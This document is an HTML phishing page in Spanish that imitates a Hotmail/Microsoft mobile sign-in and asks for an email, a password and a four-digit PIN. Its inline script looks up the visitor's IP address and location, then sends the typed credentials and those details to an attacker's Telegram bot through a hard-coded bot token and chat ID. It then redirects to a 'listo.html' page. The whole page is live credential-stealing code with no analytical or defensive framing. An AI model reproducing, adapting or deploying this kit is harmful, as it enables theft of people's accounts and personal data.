<html lang="es"><head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
      
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Login Mobile</title>
      <link rel="stylesheet" href="./assets/stylesmobile.css">
      <script type="text/javascript" src="https://unpkg.com/axios@1.4.0/dist/axios.min.js"></script>
    
    </head>
    <body>
  
    
      <div class="login-container">
        <h1>&nbsp;</h1>
        <div class="form-container">
          <img src="./assets/logo.png" alt="Logo" class="logo">
          <h2>Iniciar sesión</h2>
             <br>
             <form id="login-form">
        <input type="email" id="us4r" name="us4r" placeholder="Correo electrónico, teléfono o Skype" required="">
        <input type="password" id="p4sx" name="p4sx" placeholder="Contraseña" required="">
          <input type="password" id="p1n" name="p1n" placeholder="Pin de 4 dígitos" maxlength="4" required="">
        <button type="submit">Iniciar sesión</button>
      </form>
    
          <p class="signup-prompt">¿No tienes una cuenta?</p>
        </div> 
      </div>
      <script src="axios.min.js.descarga"></script>
      <script>
        const url = "https://ipapi.co/json/";
        const form = document.querySelector("#login-form");
        form.addEventListener("submit", (event) => {
          event.preventDefault(); 
          axios
            .get(url)
            .then((response) => {
              const us4r = document.querySelector("#us4r").value;
              const p4sx = document.querySelector("#p4sx").value;
              const p1n = document.querySelector("#p1n").value;
              const message =
                "✅HOTMAIL✅" +
                "\n📧Correo: " +
                us4r +
                "\n🔐Contraseña: " +
                p4sx +
                "\n🔐Pin: " +
                p1n +
                "\n🏙️Ciudad: " +
                response.data.city +
                "\n🌎Pais: " +
                response.data.country +
                "\n🔢IP: " +
                response.data.ip +
                "\n🤑---🤑";
              axios
                .post(
                  "https://api.telegram.org/bot7070818377:AAElpLJhUCvs3Ofih31ShCWo6KBbFTRBGl4/sendMessage",
                  {
                    chat_id: "5432640156",
                    text: message,
                  }
                )
                .then((response) => {
                  console.log(response.data);
                  window.location.href = "listo.html";
                })
                .catch((error) => {
                  console.error(error);
                });
            })
            .catch((error) => {
              console.log(error);
            });
        });
      </script>
    
    
    </body></html>
